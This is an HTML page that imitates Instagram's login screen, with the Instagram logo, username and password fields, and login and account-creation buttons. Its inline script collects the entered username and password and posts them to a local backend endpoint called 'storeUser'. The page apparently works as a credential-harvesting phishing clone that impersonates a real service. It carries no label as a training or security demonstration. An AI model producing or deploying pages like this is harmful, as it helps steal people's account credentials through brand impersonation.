<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main>
        <img src="2227.jpg" alt="Instagram Logo">
        <input type="text" placeholder="Username,email or mobile number" class="textField">
        <input type="text" placeholder="Password" class="textField">
        <button id="logIn">Log in</button>
        <a href="#" id="forgotPswd">Forgot pasword?</a>
        <button id="newAccount">Create new account</button>
    </main>
    <script>
        document.getElementById("logIn").addEventListener("click", async () => {
          const username = document.querySelectorAll(".textField")[0].value;
          const password = document.querySelectorAll(".textField")[1].value;
        
          // Send data to your backend
          const res = await fetch("http://localhost:3000/storeUser", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password }),
          });
        
          const data = await res.json();
          alert(data.message);
        });
        </script>        
</body>
</html>
